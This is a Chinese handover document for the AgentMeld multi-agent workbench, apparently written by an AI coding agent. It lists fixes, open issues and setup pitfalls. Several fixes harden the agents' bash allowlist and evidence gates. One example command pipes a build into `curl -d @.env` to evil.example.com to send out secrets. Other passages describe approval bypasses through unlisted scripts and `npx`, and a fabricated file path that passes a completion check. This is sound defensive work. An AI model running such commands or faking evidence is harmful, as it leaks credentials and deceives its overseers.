# AgentMeld 交接文档

本文写给两个人：**继续开发这个仓库的你**，以及**下一个从零开始的会话**。内容只包含本仓库代码与本次开发会话中真实发生过的事，未验证的部分会明确标注。

文末的「本地怎么跑」是本文最实用的部分——本次会话在环境上踩的坑都在那里。

---

## 一、项目是什么

**AgentMeld** 是一个本地优先（local-first）的多 Agent 协作工作台。它把复杂的 AI 辅助工作变成一场**可见的团队对话**：Conductor 先澄清意图、拆解任务，再把子任务分派给专业 Agent，记录工具证据，并把生成的产物与讨论并排展示。

核心设计不是「让 Agent 聊天」，而是**证据驱动的上下文与验收**：

```text
用户需求
  -> Conductor：澄清（ask_user）→ 规划 DAG（plan_tasks）→ 等待用户审批计划
  -> 按依赖分波次派发子任务（每个子任务 = 一个独立 Agent run）
  -> 上游产物必须通过证据校验才能绑定（output binding）给下游
  -> 下游只拿到与任务相关的上下文（Task Context Compiler）
  -> 每个 attempt 落库：上下文快照 / 证据 / 判定，事后可审计（Context Trace）
  -> Conductor 聚合并给出整体结论
```

| 维度 | 实际情况 |
| --- | --- |
| 技术栈 | Next.js 16.2.6（App Router）+ React 19 + TypeScript strict + SQLite（better-sqlite3）+ Drizzle ORM + Zustand/Immer + Tailwind |
| 运行时代码 | `src/server`（约 3.3 万行，整个项目 `src` 约 5.1 万行） |
| 数据层 | 22 张业务表，DDL 权威在 `src/db/bootstrap.ts`（见 `docs/schema.ts`… 实际文件名是 `docs/schema.md`） |
| 前端入口 | 单页客户端应用：`src/app/page.tsx` → `src/components/app-shell.tsx`（Sidebar + ChatPanel + 右栏），SSE 由 `stream-provider.tsx` 承载 |
| API | 49 个 route handler（`src/app/api/**/route.ts`） |
| 测试 | 88 个测试文件（`src/**` 62 + `tests/agent-benchmark/**` 26） |

关键概念速查：

- **Conductor**：内置 Agent，`agents.is_conductor = 1`。它负责澄清、规划、分派、聚合。群聊里**不 @ 任何人**时由它响应。
- **`@` 指定 Agent**：路由上会**绕过 Conductor**（`conversation-service.ts` 的 `pickResponders`），该 Agent 直接回答。**注意：这条路径不经过规划/派发/证据绑定**，所以通过 @ 做的工作不会被证据追踪。
- **证据门禁**：`src/server/task-result-report.ts` 的 `evaluateChildTaskResult` 对子任务做结构化校验（验收标准、目标路径、必需命令、必需证据）；`src/server/verification/verification-engine.ts` 另外做产物类型的判定。**产物绑定只认证据，不认自述。**
- **Output binding**：上游产物 → 下游 `outputKey` 的映射，只有通过校验才会写入，是下游「可信输入」的唯一来源。

---

## 二、仓库状态与约定

截至本文件写作时：`master` = `0cd0553`。

### 分支

- **默认分支是 `master`**。本次会话把它从 `release4.0` 重命名而来（版本号写进默认分支名会随版本反复改名）。
- 原来的 `main` 是一条**与本仓库无关的废弃历史**（只有 6 个提交，与 `release4.0` **没有共同祖先**），已删除。
- 被删分支的历史都用 tag 存档，没有丢东西：

  ```text
  archive/main  archive/mvp-baseline  archive/release1.1
  archive/release1.3  archive/release2.0  archive/ui-refined
  ```

- 远端现存分支：`master`、`release1.0`、`feat-llm-prompts`、以及 3 条已合并的 `fix/context-*`。

### CI 与质量基线

`.github/workflows/ci.yml` 在 **push/PR 到 `master`** 时跑 `install --frozen-lockfile` → `typecheck` → `lint` → `test` → `build`，当前全绿。

最近一次合并后的本地实测：

```text
pnpm typecheck   ✅ 0 错误
pnpm lint        ✅ 0 错误 / 52 warning（全部是既有的 unused-vars）
pnpm test         ✅ 94 文件 / 985 通过 / 3 跳过 / 0 失败
pnpm build       ✅ 成功
```

> 踩坑记录：workflow 里**不能**同时给 `pnpm/action-setup` 传 `version` 又在 `package.json` 里写 `packageManager`，否则 action 直接报错（CI 第一次运行 5 秒就失败了）。现在只保留 `packageManager` 作为唯一版本来源。

### 工作流约定（本次会话一直沿用）

```text
开分支 → 提 PR → 独立对抗式 review（另一个子代理，不带作者上下文）
       → 修 review 发现的问题（含反证测试）→ 合入 master
```

这个约定本身产出了价值：review 多次抓到我自己引入的回归（详见第三节）。

### 文档

- `docs/schema.md`：**数据库结构的唯一说明**。`bootstrap.ts` 是运行时权威，`schema.ts` 是受漂移测试保护的类型镜像；改表结构必须同时改两处。
- `README.md` 与 `docs/README.zh-CN.md`：保持同步（目前都是 234 行），改动时两边一起改。
- `docs/agentmeld-*.md`：4 份 benchmark/评测规划文档，共约 4,000 行，**内容是真实的评测记录**（含基线提交号与通过率），但更新停在 2026-07，比代码旧约 3 个月，且至少有 4 处与当前代码矛盾。

> 注意：`docs/schema.ts` 是不存在的；文件名是 `docs/schema.md`。

---

## 三、本次会话做了什么

六个 PR 全部已合入 `master`。

### #7 `18b27ca` — 4 个 P0 + CI + 测试基线 + schema 收敛 + 仓库卫生

四个安全/正确性缺陷（都先复现、后修复）：

| 缺陷 | 修复 |
| --- | --- |
| `artifact-panel.tsx` 有**自己的不安全 `MarkdownRenderer`**（遮蔽共享安全实现），用 `dangerouslySetInnerHTML` 注入未转义的产物内容 | 改用共享渲染器；全仓此类注入点清零 |
| `PATCH /api/settings` 回传**明文密钥**（`GET` 有脱敏） | 抽出 `maskSettings` 供两者共用 |
| bash 白名单可被**管道/换行绕过**：`npm run build \| curl -d @.env https://evil.example.com` 被判为「仅验证」而免审批执行 | 统一分段（`\|`、`\|&`、换行、`&`、`;`、`&&`、`\|\|`）逐段校验 |
| 验证器**不过滤失败证据**：`file_exists`/`file_changed`/`deployment_created`/`command_exit` 在 `status="invalid"` 时仍判通过 | 全部加 `status === "valid"` 门禁；部署额外校验 `deploymentStatus` |
| Conductor 聚合总结**不落库也不显示**（绕过 `consumeStream`，`messageId` 为空被前端丢弃） | 聚合改走 `consumeStream`，并给 `initialParts` 加索引偏移以免覆盖前一阶段的 parts |

同 PR 内还包含：CI、vitest 全局测试库引导、4 个真实测试失败修复、`schema.ts` 由 13 表补齐为 22 表 + 漂移守卫、`LICENSE`、`.env.example`、bench 脚本可运行、文档纠错。

**实测效果**：`pnpm test` 从 **22 失败 / 899 通过** → **0 失败 / 937 通过**（全新 clone 下）。

集成时我又发现并修掉两个既有缺陷：`factId` 由 `canonicalKey + 毫秒时间戳` 组成导致**同毫秒碰撞**（改为 nanoid）；`part.*` 事件按索引赋值而 `tool.call/result` 是 push 追加，导致**后续文本 part 覆盖掉 `tool_use`**（改为「流内索引 → 实际数组槽位」映射）。
另外把 README 里的 `db:push` 说明改成明确警告：**它只对全新空库安全**，对已建库的库会提议删除 FTS 表。

### #8 `df9ee8c` — 修复「无人值守任务卡死」

两个（第三个是 review 发现的）：

1. `VERIFICATION_PATTERNS` 把 `npx tsc/vite/vitest/eslint/oxlint` 列为合法验证命令，但 `APPROVAL_PATTERNS` 的 `/\bnpx\b/` 让**它照样要人工审批**——无人值守时永久挂起。评审时我第一版修复**自己引入了回归**：用 `\b` 收尾导致 `npx eslint-foo` 这类**registry 任意包**免审批执行（`npx` 会下载并运行它）。最终改为**完整 token 匹配** `(?![\w.-])` 并大小写不敏感。
2. `abortRun` 只 abort 控制器、**从不释放等待中的审批**，而 `cancelPendingBashForRun`/`cancelPendingWritesForRun` 早已写好却**零调用**。现在 abort 会结算四个审批队列。
3. 适配器只在每轮开始前检查一次 abort signal，导致同一轮里第二个需审批的工具仍会挂起 —— 改为每个工具前都检查。

**实测效果**：修复前那次番茄钟任务里 Reviewer 在 `npx eslint` 审批上**永久挂起**、任务因缺少 `review_report` 被判失败、2 个 run 永久 `running`；修复后重跑 **5/5 run 全部 complete、bash 待审批始终为 0**，Reviewer 正常产出 `review_report`。

### #9 `ec75d69` — 让判定与报错准确

- `findUnsupportedArtifactClaims` 原本把**报告的散文**（`summary`）拿去正则匹配产物 id，于是叙述里写错一个字符就作废整轮。改为：任务**有**平台记录的产物时只校验「平台记录 ↔ 证据账本」一致性；**完全没有**产出产物时，叙述里的 id 仍视为声明（这是 false-completion 的形状）。
- `conductor_task_results.verification_status` **恒为 `not_started`**（INSERT 列里没有它）——现在按任务实际结果落库。
- 抽出 `src/server/provider-endpoints.ts` 统一 base URL 解析（适配器与 `conversation-context` 共用），并让适配器也支持 `<PROVIDER>_BASE_URL`；**显式填的 `apiBaseUrl` 原样透传**不改写。
- API 报错**点名 provider 与实际 endpoint**（这次排障的直接收益：能一眼看出「密钥来自 A 服务、请求打到 B 服务」）。

### #10 `9bbd209` — 只运行工作区真正声明的脚本

`npm run build-evil` 这类**未声明**的脚本名，原先只按前缀匹配就被当作验证命令执行。现在要求脚本真实声明在工作区 package.json 的 `scripts` 里（按序追踪 `cd`，识别 `-w/--workspace/--prefix/-C/--cwd`，符号链接先 realpath，**绝不读取工作区外的 package.json**，越界或目录不可知一律拒绝）。

> 这条**不是沙箱**：Agent 可以先用 `fs_write` 声明脚本再运行——但那时脚本名已无关紧要。它的价值是精确性，让策略表述与行为一致。真实运行中已观察到 Agent **主动声明 `build`/`check`/`test` 并写 `build.mjs`** 来满足证据要求，说明这条策略可用。

顺带：缺 Key 的报错不再硬编码「DeepSeek」，按 Agent 实际 provider 生成（`openai-compatible` 单独措辞，因为它的 Key 按设计只能配在 Agent 上）。

### #12 `b01ec40` — 渲染评估器真正强制的东西（**本次最关键的修复**）

**根因**：`evaluateChildTaskResult` 强制要求验收标准、目标路径、必需命令、必需证据，但**这些从未渲染进子任务提示词**——生产路径的 `context-renderer.ts` 输出的 `<evidence_contract>` **只有三行注释**，而唯一会渲染契约的 `buildChildTaskPrompt` **只被自己的测试调用**。于是群聊任务在结构上必然失败，包括最简单的任务。

修复：

1. `TaskContextEnvelope.requirements` 新增这四个字段并由编译器填充；渲染器逐项输出。**字段设为必填后立刻暴露了第二个 envelope 生产者**（`buildMinimalContextEnvelope`）同样漏了契约——遗漏从此是编译错误。
2. `requiredEvidence` **不再逐字子串匹配**（那些条目是模型自撰的自然语言，逐字复现等于不可能）；改为要求报告携带**结构化证据**。

评审又抓到两处**我这次改动引入的**问题：渲染了评估器已过滤的**自动验证 criterion**（Agent 如实回报会被另一条检查判失败）→ 改为渲染 `humanReviewedCriteria(...)`；**契约文本没计入 token 预算** → 已并入。

**实测效果（B1「Hello World 静态页」）**：

| | 修复前 | 修复后 |
| --- | --- | --- |
| 耗时 | 103s | **39s** |
| 输入 token | 158,416 | **26,068（−84%）** |
| run 数 | 4（含 2 次失败重试） | **2（无重试）** |
| 产物绑定 | **0** | **1** |
| 判定 | passed 6 / failed 0 / missing 9 | passed 2 / failed 0 / missing 3 |

两次运行的 `requiredEvidence` 都非空（第二次要求更多），所以改善**不能**用「这次计划更简单」解释。

**B3「记账小应用」实测**：上一轮 2.17M 输入 token、2 个绑定、t3 与恢复任务双双被拒；本轮 3.32M 输入 token、**4 个绑定**（prd、style-guide、web_app、**review_report**）、**4 个任务 verified**（含 Reviewer 与恢复任务），只剩 t3 被拒——而拒绝理由从「`缺少成功命令证据: npm run build`」（结构上不可满足）变成了「`命令证据失败: npm test`」（**它自己跑的测试真的失败了**）。证据门禁从「必然失败」变成了「真的在判质量」。

**E1 负向验证**（禁止写产物但声称产出假 id）：**完全按设计工作**——`report-artifact-claims-supported` 以 `guessed_artifact_id: art_benchmark_fake_123` 拒绝，0 产物、0 绑定。

### #13 `0cd0553` — 收尾 Conductor 的审批 meta-attempt

审批计划时会往 `task_attempts` 写一行 `task_id='conductor'`（给 `approval_resolved` 证据当容器），但**以 `running` 插入后从不更新** → 每个走过审批的计划都留下一个永久 running 的 attempt（六任务群聊里 4/4 复现）。

评审指出我的第一版修复**不完整**：`pending-questions.ts` 会用**同一个行 id** 抢先以 `running` 插入（Conductor 在规划阶段提问时），于是审批时的 `INSERT OR IGNORE` 被主键冲突**静默忽略**——**恰好是提问过的那些计划**。最终改为 `ON CONFLICT(id) DO UPDATE` 写成终态，并改用该列既有的成功值 `reported_complete`。

---

## 四、未完成项（按优先级）

标注 ✅ 的是**我在本次会话中亲自验证过**的；标注 ⚠️ 的是**来自子代理静态审查**、我未独立复现的。

1. ⚠️ **检查 ⑧ 仍接受模型自述的结构化证据**：一条**编造的文件路径** + 空运行时证据即可通过（子代理用探针复现：`{status:"complete"}`）。相对 ⑥（路径）/⑦（命令）的独有价值只剩「必须给结构化证据而非纯散文」。
   我**有意**没有收紧成「必须有运行时证据」：`write_artifact` 不记录任何 file/command 运行时证据，而 PM/UI 这类**只产出文档产物**的任务很常见——收紧会拿一个弱门禁换一个**误杀风险**。若要改，建议做成 trace warning，而不是恢复成阻塞条件。
2. ✅ **检查 ⑦ 的等价判定**：`npm run build` 与 `npm run check`/`npm test` **不算等价**（`commandSatisfiesRequirement` 按 `getValidationCommandKind` 比较）。B3 上一轮的失败正是这个。渲染契约后 Agent 能看到确切命令，但该判定是否该放宽仍值得讨论。
3. ✅ **attempt 未报告时只记 `not_started`**：子任务干完活但**没调 `report_task_result`** 时，`task_attempts` 只留下 `failed / not_started`，看起来像「没验证」，看不出真正原因是「没报告」。本次任务矩阵里 B1 与 B3 各出现过一次。
4. ⚠️ **10/24 个 benchmark fixture 依赖未声明的宿主工具链**（python3 + pytest/pandas/pyarrow/opencv/Pillow/reportlab/transformers、docker、Playwright Chromium），仓库里没有 `requirements.txt`/`Dockerfile`/环境预检；6 条 draft 声明 `environment.kind="container"` 但**没有容器运行器**。
   我亲自验证的环境事实：`python3` ✅ 有、**`pytest` 缺失**、`docker` ✅ 有、**Playwright 自带浏览器未安装**（不过 benchmark 的浏览器断言现在会回退到系统 Chrome）。
5. ✅ **`pnpm quality:gates` 在全新 clone 必然 exit 1**：gate1 需要 ≥5 条 fixture 记录，而数据源 `fixture-reports/` 只由手工 POST 写入，`agent:bench` 写的是另一个目录。我实测输出 `0/5 fixtures run` 并 exit 1——**这是预期行为，不是故障**。
6. ⚠️ **benchmark 策略注册表未生效**：`strategy-registry` 的 `useEvidenceAware` / `maxRecentMessages` 从未被读取，所以所谓「基线策略臂」其实仍跑完整证据流水线 → **A/B 对比度不成立**。另外评测默认策略（`evidence_aware_context`）与生产默认（`evidence_aware_context_with_role_contracts`）不一致。
7. ⚠️ **`conductor_task_results.verification_status` 之外仍有一处不一致**：并发的文件冲突路径会把内存结果改成 blocked 但不重写 DB（现有 status 不一致的同源问题）。
8. ✅ **策略摩擦会烧轮次**：B3 的 18 次工具调用被策略拒绝（多数是 `BASH_VERIFICATION_ONLY`——模型想 `ls dist`/`cat` 看一眼却被要求改用 `fs_list`，还出现一次 `eval` 尝试与一次源文件改写），另有 6 次 `fs_patch` 空补丁重试。不致命，但成本真实。
9. ✅ **同一个产物被反复写**：B3 里风格指南被写了 3 次（产物列表出现 3 份同名文档），B1 修复前也写过 3 个同名 web_app。
10. ⚠️ 我**没能复现**最初那次「回答澄清后不继续规划」的异常（B2 的消息当时有 `tool_use` 却没有 `tool_result`）。受控复现显示流程**正确**（见第五节），所以没有可修对象；成因最可能是当时环境不稳，但**我没有证据**，故不作为结论。

> 提醒：写作本文件时，`src/server/pending-questions.ts` 与 `src/server/conductor-service.ts` 上正有并行改动进行中，其结果**未包含**在本文档内。以 `git log` 与 diff 为准。

---

## 五、本地怎么跑（踩坑集中在这里）

### 1. 装依赖与启动

```bash
pnpm install          # pnpm 10.33+，Node >= 20
pnpm dev              # 默认 http://localhost:3000
```

`pnpm dev` 在**全新数据目录**下 1–2 秒启动，自动创建 `.agentmeld-data/agentmeld.db`、建 22 张表、seed 6 个内置 Agent。**不需要先手工建库。**

### 2. 模型配置（最容易踩的坑）

**Agent 的模型配置只存在数据库里**——`agents.model_id` 与 `agents.api_base_url`。所以：

> **一旦 `rm -rf .agentmeld-data`，所有 Agent 会静默变回默认的 `deepseek-chat`**，而你配置的网关**并不提供这个模型** → 任务会以「模型不存在 / 401」失败，报错还很容易被误读为密钥问题。

`.env.local`（已被 gitignore）负责提供**密钥与端点**。本次会话用的是 OpenAI 兼容网关：

```env
DEEPSEEK_API_KEY=<网关密钥>
DEEPSEEK_BASE_URL=https://<网关主机>       # 只写主机，应用会自行追加 /v1
```

清库或换库之后，**重新应用模型配置**（本次会话用的语句）：

```ts
getDatabase().prepare(
  `UPDATE agents SET model_provider='deepseek', model_id='deepseek-v4-flash',
     api_base_url=NULL, api_key=NULL, supports_vision=1, updated_at=? WHERE is_builtin=1`
).run(Date.now());
```

放在仓库内的一个临时 `.mts` 文件里执行（`tsx` 需要从仓库的 tsconfig 解析 `@/` 别名）：

```bash
node --import ./scripts/load-env.mjs --import tsx .tmp-xxx.mts
```

改完用 `/api/bootstrap` 复核，别只看脚本输出。

### 3. 绝不要在 dev server 运行时删数据目录

**血泪教训**：server 启动时打开 `agentmeld.db`，之后你 `rm -rf .agentmeld-data`，**server 仍握着那个已被删除的 inode**。于是：

- `/api/*` 照常返回数据（读的是旧 inode）
- 外部脚本新开连接，创建的是**另一个空文件**

结果就是「API 有数据、脚本读到 `agent_runs = 0`」的分裂状态，排查时会浪费大量时间（本次会话就栽在这里）。

**规则：要清库就先停 server，清完再起，然后重新应用模型配置（见上）。**

### 4. 测试

```bash
pnpm test        # vitest，94 文件
```

测试通过全局 `setupFiles` 为**每个测试文件**创建隔离且已建表的临时库（`src/test/test-database.ts` 的 `setupTestDatabase`），所以 `pnpm test` **不依赖** `.agentmeld-data`，全新 clone 下应该全绿。

> 历史：这个引导最初不存在，导致全新 clone 下 22 个测试失败（它们隐式依赖你本机已 bootstrap 过的库）。

### 5. benchmark / 评测脚本

```bash
pnpm agent:bench:all      # 只列出 fixture（不执行）
pnpm agent:bench --case <fixtureId>     # 进程内跑单个用例，不需要起服务
pnpm agent:bench --suite smoke          # 2 条 smoke 用例
pnpm e2e:report                         # 列出 fixture / 评估某次运行
pnpm quality:gates                      # 质量门禁（全新 clone 会 exit 1，见第四节）
```

这些脚本统一通过 `scripts/load-env.mjs` 先读 `.env.local` 再读 `.env`（早先是 `node --env-file=.env`，与 README 教的 `.env.local` 不一致，**5 个脚本 100% 跑不起来**，已修）。

`--case` 收的是 **fixture id 而不是文件名**（例如 `pomodoro-timer.json` 里的 id 是 `pomodoro-timer-basic`，有 5 条这样不一致）。

`src/server/adapters/claude-code-adapter.ts` 与 `codex-adapter.ts` 是**占位实现**（注释自称 stub），`mcp-bridge.ts` 也已写好但无调用方——实际可用路径只有 OpenAI 兼容的 `custom` 适配器。

### 6. `skills/`

只有两份：`skills/README.md` 与 `skills/add-tool.md`。后者是**真实可用的「如何加一个工具」教程**（本次会话清理了它指向的、仓库里并不存在的 `specs/`、`CLAUDE.md` 等引用）。仓库里**没有 `specs/` 目录**。

### 7. 用 CDP 驱动界面（不用手点）

Playwright 自带浏览器**不需要下载**——直接用系统 Chrome：

```bash
"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome" \
  --headless=new --remote-debugging-port=9223 \
  --user-data-dir=/tmp/am-cdp --disable-extensions about:blank
```

```js
const browser = await chromium.connectOverCDP("http://127.0.0.1:9223");
```

三个必须知道的点：

1. **要用 `http://localhost:3000`，不要用 `http://127.0.0.1:3000`**。Next 16 把非 `localhost` 的来源视为跨源并**拦掉 dev 资源（HMR）**，页面会**永远停在「正在启动 AgentMeld...」**，而服务端日志只会给一行 warning。
   （`next.config.ts` 现在已加 `allowedDevOrigins: ["127.0.0.1"]`，所以 127.0.0.1 也能用；**改代码前请以该文件为准**。）
2. **每个开着的 AgentMeld 标签页都持有一条 SSE 连接**。积累十几个陈旧标签页后，`page.goto` 会开始超时。驱动脚本应在开始时关掉旧页并复用同一个 page。
3. **Conductor 会问多轮澄清**（`ask_user`），每轮都阻塞 run。驱动必须**在每一轮轮询里都去应答**，不能只答一次。

应答用 API（DOM 选择器不可靠）：

```bash
POST /api/pending-questions/<id>/answer
{ "answers": { "<问题原文>": "<选定的 label>" } }     # 键是问题原文
```

`<id>` 从 `GET /api/conversations/<cid>/pending-questions` 取。

### 8. 本次会话留下的本地驱动脚本（未跟踪，不进仓库）

- `.tmp-tasks.mts`（仓库根，约 17.6 KB）：任务矩阵驱动。支持 `--only A1,B1` 选子集、`--force` 重跑已完成的、每个任务一个独立会话；会自动点「批准」卡、**通过 API 循环应答澄清**、按阶段截图；完成判定要求**连续两次轮询都空闲**（否则会在 Conductor 生成恢复计划的间隙里提前收尾）。
- `/tmp/am-tasks/`：输出目录（每任务一个 JSON + 截图 + `run.log`）。

它连接数据库的方式是**进程内直连**——所以第 3 条的「句柄分裂」会直接让它的指标采集成空。真出现时改用 API 采集（`/api/context-trace/run/<conductorRunId>` 一次性给出任务、attempt、判定、绑定）。

### 9. 成本

**一次真实任务不便宜。** 本次实测：

| 任务 | 输入 token | 耗时 |
| --- | --- | --- |
| 单 Agent 直答（@PM） | ~2.7k | 14s |
| 单 Agent 出文档（@UI） | ~12k | 38s |
| Hello World 静态页（群聊） | ~26k | 39s |
| 番茄钟（群聊） | ~183k | 278s |
| **记账小应用（群聊，偏难）** | **~3.3M** | ~10 分钟 |

硬任务的成本比简单任务高**两个数量级**（多轮重试 + 更多工具调用）。做批量评测前先给预算设上限。

---

## 六、建议的下一步

1. **在干净的 master 上重跑一次完整任务梯度**，拿到一份没有历史包袱的基线（本次梯度是分几次、在修复过程中跑的，横向对比不严格）。注意先应用模型配置、别在跑的时候删数据目录。
2. **决定检查 ⑧ 的取向**（第四节第 1 条）：保留现状并把它标注为「报告纪律」而非取证门禁，或者加一条 trace warning。**不建议**直接收紧成必须提供运行时证据——会误杀只产出文档产物的任务。
3. **修「没报告」的诊断**（第四节第 3 条）：attempt 结束时若没收到 `report_task_result`，写一条明确的失败原因。这是小改动，收益是让一类沉默失败变得可诊断。
4. **决定 ⑦ 是否接受同类验证命令**（第四节第 2 条），或把「必须原样运行这条命令」写进契约渲染，让 Agent 无处可猜。
5. **让 `quality:gates` 在全新 clone 上有意义**（第四节第 5 条）：给它一个 `--from-benchmark-run`，或让 benchmark 同步写 `fixture-reports/`；gate1 改为按去重后的 fixture id 计数。
6. **补齐那 10 条 tb2d fixture 的宿主依赖**（第四节第 4 条）：至少写进 README，并给 benchmark 加环境预检——缺 python3/docker/浏览器时把 case 标 `blocked`，而不是抛异常把整个 trial 打成 error。
7. **给 UI 组件补测试**：39 个组件只有 2 个有测试，而本次修复的 XSS 就在组件里。
